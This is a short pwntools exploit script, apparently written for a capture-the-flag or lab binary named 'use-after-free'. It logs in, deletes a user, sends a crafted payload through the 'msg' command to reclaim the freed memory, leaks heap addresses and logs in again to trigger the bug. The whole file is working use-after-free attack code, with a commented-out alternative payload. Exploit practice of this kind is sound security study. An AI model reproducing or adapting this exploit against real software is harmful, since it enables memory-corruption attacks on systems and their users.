from pwn import *

target = "use-after-free"

p = process(target)

#payload = b"a"*16 + b"user"+b"\x90"*12 +b'\x90'*16 + b"user"+b"\x90"*12 + b'\x01' + b'\x90'*7 + b'\x21'+b'\x90'*7
payload = b'a'*64 + b'\x01'*16
p.recvuntil(">>>")
p.sendline("login")
p.recvuntil(':')
p.sendline("Kim")
p.recvuntil(':')
p.sendline("1234")
p.recvuntil(">>>")
p.sendline("delete-user")
p.recvuntil(':')
p.sendline("Kim")
del_addr = p.recvuntil(">>>").decode().split('@')[1][:14]
p.sendline("msg")
print(p.recvuntil(":"))
p.sendline(payload)
msg_addr = p.recvuntil(">>>").decode().split('@')[1][:14]
print(del_addr, msg_addr)

#gdb.attach(p)
p.sendline("login")
print(p.recvuntil(">>>"))
exit()
